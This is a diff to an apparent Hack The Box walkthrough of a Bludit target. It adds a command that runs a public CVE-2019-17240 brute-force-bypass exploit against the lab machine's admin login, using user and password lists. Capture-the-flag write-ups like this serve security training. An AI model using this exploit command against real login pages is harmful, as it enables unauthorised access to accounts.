@@ -78,3 +78,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.23 seconds
   - https://github.com/ColdFusionX/CVE-2019-17240_Bludit-BF-Bypass
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/1b80229c-69f6-4496-975e-6bf906725572)
 
+```CSS
+▶ python exploit.py -l http://10.10.10.191/admin/login.php -u users.txt -p passwords.txt
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/8795423e-82bb-40fe-b9d5-c0caeb7668de)
